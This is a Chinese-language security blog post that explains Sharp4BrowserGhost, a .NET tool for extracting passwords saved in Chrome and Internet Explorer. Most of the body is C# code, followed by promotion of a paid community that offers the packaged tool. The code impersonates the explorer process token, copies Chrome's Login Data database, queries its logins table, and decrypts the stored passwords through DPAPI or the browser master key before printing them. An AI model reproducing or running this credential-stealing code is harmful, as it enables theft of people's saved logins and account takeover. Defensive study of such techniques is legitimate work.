---
title: .NET 一款获取主流浏览器存储密码的工具
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493686&idx=1&sn=41ea86e3c3d46712428fd1e6eb3d30b7&chksm=fa5946dbcd2ecfcd751c44c3d4f851f89e4e8a4d83b94b481854296751d4cfed302da27b1461&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-07-30
fetch_date: 2025-10-06T17:45:14.371256
---

# .NET 一款获取主流浏览器存储密码的工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibO1fcf18f9jWgD8YAicuAewq4RRInoxLpaCzNqlaJALWibiafwq8ka5T8AMVAIau134iaoBDkmyLWvmw/0?wx_fmt=jpeg)

# .NET 一款获取主流浏览器存储密码的工具

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

基本介绍

Sharp4BrowserGhost是一款抓取 Google Chrome 和 Internet Explorer 浏览器存储的密码的工具。它基于 .NET Framework 2.0，利用进程模拟技术提升权限，访问浏览器的本地数据存储，并提取保存的登录信息。本文将详细解析其核心代码，以揭示其工作原理和方法。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibO1fcf18f9jWgD8YAicuAew8a590mwE2L1VHa2G7t3ezk8lUia341cy93do76ib3fE6v7NfOHtKtNIQ/640?wx_fmt=jpeg&from=appmsg)

03

编码实现

以下是 Sharp4BrowserGhost的主要功能实现代码，通过调用各种子模块来执行具体的数据提取任务。首先，代码通过 Process.GetProcesses() 获取当前所有运行的进程，并提取每个进程的 ID、名称和用户名。

```
foreach (Process process in Process.GetProcesses())
{
    int id = process.Id;
    string processName = process.ProcessName;
    string processUserName = Program.GetProcessUserName(id);
```

接着，查找名称为 explorer 的进程，并通过 ImpersonateProcessToken(id) 模拟该进程的令牌，从而提升当前进程的权限，假装为 Explorer 进程的用户。

```
    if (processName == "explorer")
    {
        Console.WriteLine("[+] [{0}] [{1}] [{2}]", id, processName, processUserName);
        Program.ImpersonateProcessToken(id);
        Console.WriteLine("[+] Impersonate user {0}", Environment.UserName);
        Console.WriteLine("[+] Current user {0}", Environment.UserName);
```

然后，获取 Chrome 存储登录数据的文件路径，将其复制到临时文件以供后续操作。具体代码如下所示。

```
string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
string filePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Local State";
string tempFileName = Path.GetTempFileName();
File.Copy(text, tempFileName, true);
Console.WriteLine("[+] Copy {0} to {1}", text, tempFileName);
```

随后，执行 SQL 查询获取登录数据。使用 ProtectedData.Unprotect 方法解密存储的密码，如果失败，则使用 Program.GetMasterKey 获取主密钥并调用 Program.DecryptWithKey 解密密码。

```
        SQLiteDatabase sqliteDatabase = new SQLiteDatabase(tempFileName);
        string query = "SELECT origin_url, username_value, password_value FROM logins";

        foreach (object obj in sqliteDatabase.ExecuteQuery(query).Rows)
        {
            DataRow dataRow = (DataRow)obj;
            string arg;
            string arg2;
            try
            {
                arg = (string)dataRow["origin_url"];
                arg2 = (string)dataRow["username_value"];
            }
            catch
            {
                continue;
            }
            byte[] encryptedData = Convert.FromBase64String((string)dataRow["password_value"]);
            string arg3;
            try
            {
                arg3 = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
            }
            catch (Exception)
            {
                byte[] masterKey = Program.GetMasterKey(filePath);
                arg3 = Program.DecryptWithKey(encryptedData, masterKey);
            }
            Console.WriteLine("\tURL -> {0}\n\tUSERNAME -> {1}\n\tPASSWORD -> {2}\n", arg, arg2, arg3);
        }
```

通过这些步骤，Sharp4BrowserGhost 利用进程模拟和浏览器存储文件的解密，成功提取 Chrome 和 IE 浏览器中的登录信息。工具已经打包在星球，感兴趣的朋友可以加入自取。

04

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibBCrauQbUXaYlRQQKuy6ZRWYfI5fGSNRzQCia4EzreWe3efR7HIE3CLqP7eIJAUwdDDoqs7yfHhQw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493629&idx=1&sn=83235ca782ed28b7faaa18e2fe1919bb&chksm=fa594910cd2ec00688c18a740d98a9c7d75cca2190fb168285bc95facdfd0a20a854ef4d6bc1&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOE2ogFoYIdqnYynqF6XyicI7XfRsWsn36wsCpKpAJcIQOicZUhbDJOe0w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488762&idx=1&sn=a5710927a6ba09b5c83adf616e2b12ae&chksm=fa5aba17cd2d330119d1ab2ce4b3a434274f0adf96729dbf8f04bef16c389565fc144f84d341&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

06

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。

 目前星球门票¥199，后期价格随着内容和质量的不断沉淀会适当提高，星球计划于07.30日涨价 至 ¥239，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

    我们倾力打造专刊、视频等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9XgicSeCfnDO0KyvDNdCZhG3pTSWHRekG0Wrp0FXyHO1mz9ia5uiaICjCmg5jIzx4ERLU8MjXWVSkCw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

我们还有一个会员专属的内部星球陪伴群，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz07qexJ82p5wxfXsVyzE3cc1WOVswovGicr35RthtQKpibYwibbSvicTRnjA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YiceDqVJgBwH8icb8Hsiay3HfibYVssEWd6Xvz1wZm3ar62B6uH3QSawqH5blnicVUeCtfex4AvyIw3JOg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaO...